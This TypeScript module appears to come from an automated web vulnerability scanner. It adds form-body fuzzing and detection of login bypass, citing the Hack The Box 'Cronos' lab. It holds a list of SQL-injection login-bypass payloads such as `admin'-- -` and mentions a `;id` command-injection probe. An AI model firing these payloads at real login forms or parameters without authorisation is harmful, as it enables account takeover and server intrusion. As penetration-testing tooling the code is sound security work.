/**
 * Form-urlencoded fuzzing + login auth-bypass detection for the deep sweep.
 *
 * GAP (HTB Cronos): welcome.php takes application/x-www-form-urlencoded (command=..&host=..).
 * deriveTargets only fuzzed JSON leaves + query params, so the deterministic command_injection
 * probe never reached it — even though the payload works (`;id` -> uid= reflected). And the
 * login SQLi (`admin'-- -`) is proven by a 302 auth-state change, which a body_contains/error
 * oracle misses. These helpers close both, black-box (generic markers + control differential).
 */

/** If `body` is application/x-www-form-urlencoded (k=v&k=v, at least one '='; not JSON/XML),
 * return its parameter names in order; else null. */
export function parseFormBody(body: string | null | undefined): string[] | null {
  if (!body) return null;
  const s = body.trim();
  if (!s || s.startsWith("{") || s.startsWith("[") || s.startsWith("<")) return null;
  if (!/^[^=&\s]+=[^&]*(?:&[^=&\s]+=[^&]*)*$/.test(s)) return null;
  const names = s.split("&").map((kv) => kv.split("=")[0]).filter(Boolean);
  return names.length ? [...new Set(names)] : null;
}

/** Rebuild a form-urlencoded body with `param` set to `value` (URL-encoded), preserving the
 * other pairs. If `param` is absent it is appended. */
export function setFormParam(body: string, param: string, value: string): string {
  const pairs = body.split("&").filter(Boolean);
  let found = false;
  const out = pairs.map((kv) => {
    const k = kv.split("=")[0];
    if (k === param) { found = true; return `${k}=${encodeURIComponent(value)}`; }
    return kv;
  });
  if (!found) out.push(`${param}=${encodeURIComponent(value)}`);
  return out.join("&");
}

export interface Resp { status: number; headers: Record<string, string>; body: string }
function header(h: Record<string, string>, name: string): string | undefined {
  for (const [k, v] of Object.entries(h ?? {})) if (k.toLowerCase() === name) return v;
  return undefined;
}
/** Extract the session-cookie value from a Set-Cookie header (first cookie's value). */
function sessionCookieValue(setCookie: string | undefined): string | null {
  if (!setCookie) return null;
  const m = /^[^=;\s]+=([^;\s]{6,})/.exec(setCookie.trim());
  return m ? m[1] : null;
}

/**
 * A login auth-bypass is confirmed when the EXPLOIT (injection in username + wrong password)
 * produces an AUTH-SUCCESS signal the benign-wrong-login CONTROL lacks: a 3xx redirect to a
 * post-login Location, or a fresh session cookie — a signal string PRESENT in the exploit
 * exchange and ABSENT in the control. Returns that marker (for a body_contains differential
 * over serializeExchange), or null. Generic: no target-specific literal.
 */
export function authBypassMarker(control: Resp, exploit: Resp): string | null {
  if (!exploit || exploit.status === 0) return null;
  const cLoc = header(control.headers, "location");
  const eLoc = header(exploit.headers, "location");
  const inControl = (s: string) => `HTTP ${control.status}`.includes(s) || JSON.stringify(control.headers).includes(s) || (control.body ?? "").includes(s);
  // (1) Redirect to a post-login page only on the exploit.
  const exploitRedirects = exploit.status >= 300 && exploit.status < 400 && Boolean(eLoc);
  if (exploitRedirects && eLoc && eLoc !== cLoc && eLoc.length >= 3 && !inControl(eLoc)) return eLoc;
  // (2) A session cookie present only on the exploit.
  const eCookie = sessionCookieValue(header(exploit.headers, "set-cookie"));
  const cCookie = sessionCookieValue(header(control.headers, "set-cookie"));
  if (eCookie && eCookie !== cCookie && !inControl(eCookie)) return eCookie;
  return null;
}

/** SQLi auth-bypass payloads for the username field of a login form (classic comment-outs).
 * Small + generic — appended, not target-specific. */
export const LOGIN_BYPASS_PAYLOADS = [
  "admin'-- -", "admin' -- ", "' or '1'='1'-- -", "admin'#", "' or 1=1-- -", "admin'/*",
] as const;
